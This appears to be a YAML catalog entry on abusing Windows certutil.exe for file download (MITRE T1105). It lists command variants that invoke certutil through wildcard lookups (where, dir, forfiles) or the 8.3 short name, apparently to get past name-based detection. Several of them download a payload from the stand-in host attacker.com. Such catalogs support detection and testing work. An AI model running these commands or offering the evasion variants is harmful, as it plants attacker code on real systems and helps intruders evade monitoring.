---
Name: certutil
Description: "Certificate management utility. Widely abused for base64 encoding/decoding and downloading files from the internet."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\certutil.exe
Category: download
MitreID: T1105
Patterns:
  - Pattern: "for /f %i in ('where c*til.exe') do %i -urlcache -split -f http://attacker.com/payload.exe C:\\payload.exe"
    Wildcards: ["*"]
    Notes: "CMD requires 'where' + for loop since glob doesn't work in command position. Star matches 'er' + 'u'"
  - Pattern: "for /f %i in ('where cert?til.exe') do %i"
    Wildcards: ["?"]
    Notes: "Single char wildcard in where query"
  - Pattern: "for /f %i in ('where certutil*') do %i"
    Wildcards: ["*"]
    Notes: "Trailing star matches '.exe' and variant names"
  - Pattern: "cmd /c for /f %i in ('dir /b C:\\Windows\\System32\\cert*.exe') do %i"
    Wildcards: ["*"]
    Notes: "Using dir /b with glob to find binary"
  - Pattern: "for /f %i in ('where /r C:\\Windows c*til.exe') do %i"
    Wildcards: ["*"]
    Notes: "Recursive where search with wildcard"
  - Pattern: "forfiles /p C:\\Windows\\System32 /m certu*.exe /c \"cmd /c @file -urlcache -split -f http://attacker.com/p.exe C:\\p.exe\""
    Wildcards: ["*"]
    Notes: "forfiles /m with certu* uniquely matches certutil.exe in System32 — @file expands to matched filename"
  - Pattern: "C:\\Windows\\System32\\CERTUT~1.EXE -urlcache -split -f http://attacker.com/p.exe C:\\p.exe"
    Wildcards: []
    Notes: "8.3 short filename (SFN) — requires 8.3 name generation enabled (NtfsDisable8dot3NameCreation=0); CERTUT~1 is auto-generated for certutil.exe"
PlatformNotes: |
  **CMD does not expand glob wildcards in the command position.** Unlike bash, typing `c*rtutil` will not work directly in CMD. Instead, use:
  - `for /f %i in ('where c*til.exe') do @%i [args]` — resolves via where.exe
  - `for /f %i in ('dir /b C:\Windows\System32\cert*.exe') do @%i` — resolves via dir

  **8.3 SFN note**: Short filename paths (CERTUT~1.EXE) require `NtfsDisable8dot3NameCreation=0` in the registry. On systems where 8.3 generation is disabled, these paths do not exist.

  In batch scripts, use `%%i` instead of `%i`.
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
---
